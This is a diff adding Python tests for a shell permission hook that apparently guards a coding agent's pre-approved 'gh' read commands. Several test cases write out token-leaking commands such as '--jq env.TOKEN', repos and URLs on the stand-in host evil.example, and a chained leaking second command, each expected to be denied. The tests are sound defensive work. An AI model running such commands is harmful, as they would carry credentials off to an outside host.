@@ -255,3 +255,69 @@ class TestTheLogIsPerUserAndPrivate:
 
     def test_the_hook_names_no_path_in_tmp(self):
         assert "/tmp" not in HOOK.read_text()
+
+
+def decision(tmp_path: Path, command: str, allow: list[str] | None = None) -> str:
+    """The hook's decision for `command`: 'allow', 'deny', or 'prompt' (no output)."""
+    claude = tmp_path / ".claude"
+    claude.mkdir(exist_ok=True)
+    (claude / "settings.json").write_text(
+        json.dumps({"permissions": {"allow": allow if allow is not None else ALLOW}})
+    )
+    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
+    env = {"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"}
+    proc = subprocess.run(
+        ["bash", str(HOOK)], input=payload, capture_output=True, text=True,
+        cwd=tmp_path, env=env, timeout=10,
+    )
+    if '"permissionDecision":"deny"' in proc.stdout:
+        return "deny"
+    if '"permissionDecision":"allow"' in proc.stdout:
+        return "allow"
+    return "prompt"
+
+
+class TestGhReadGuard:
+    """A pre-approved `gh` READ verb can carry an environment token off the box, or
+    reach a host other than github.com, through its own flags. The hook denies exactly
+    those shapes — a hook 'deny' is the one decision that overrides an allow grant —
+    and leaves every other gh call, including the fleet's real reads, untouched.
+
+    The flag-by-flag rule and its allow-list live in plugin-hooks/gh-guard-decide.py
+    (unit-tested separately)."""
+
+    GH_ALLOW = ["Bash(gh pr list *)", "Bash(gh pr view *)", "Bash(gh api *)", "Bash(gh issue list *)"]
+
+    def test_env_reading_jq_is_denied(self, tmp_path):
+        assert decision(tmp_path, "gh pr list -R o/r --json number --jq 'env.TOKEN'", self.GH_ALLOW) == "deny"
+
+    def test_foreign_host_repo_is_denied(self, tmp_path):
+        assert decision(tmp_path, "gh pr list -R evil.example/o/r --search secret", self.GH_ALLOW) == "deny"
+
+    def test_web_is_denied(self, tmp_path):
+        assert decision(tmp_path, "gh pr list -R o/r --web", self.GH_ALLOW) == "deny"
+
+    def test_a_url_positional_naming_a_host_is_denied(self, tmp_path):
+        assert decision(tmp_path, "gh pr view https://evil.example/o/r/pull/1 --json number", self.GH_ALLOW) == "deny"
+
+    def test_a_deny_overrides_a_bare_bash_grant(self, tmp_path):
+        # A hook deny is the only decision that overrides an allow rule, bare Bash included.
+        assert decision(tmp_path, "gh pr list --json number --jq env.TOKEN", ["Bash"]) == "deny"
+
+    def test_a_deny_overrides_a_matching_allow_pattern(self, tmp_path):
+        assert decision(tmp_path, "gh pr list --json number --jq env.TOKEN", self.GH_ALLOW) == "deny"
+
+    def test_an_ordinary_read_still_approves(self, tmp_path):
+        assert decision(tmp_path, "gh pr view 123 --json number,title", self.GH_ALLOW) == "allow"
+
+    def test_a_field_jq_read_still_approves(self, tmp_path):
+        assert decision(tmp_path, "gh api user --jq '.login'", self.GH_ALLOW) == "allow"
+
+    def test_an_explicit_github_com_host_still_approves(self, tmp_path):
+        assert decision(tmp_path, "gh pr list -R github.com/o/r --json number", self.GH_ALLOW) == "allow"
+
+    def test_a_leaking_second_command_is_denied_even_after_an_allowed_first(self, tmp_path):
+        assert decision(tmp_path, "gh pr view 1 --json number && gh pr list --jq env.TOKEN", self.GH_ALLOW) == "deny"
+
+    def test_a_non_gh_command_is_unaffected(self, tmp_path):
+        assert decision(tmp_path, "git status", self.GH_ALLOW + ["Bash(git *)"]) == "allow"
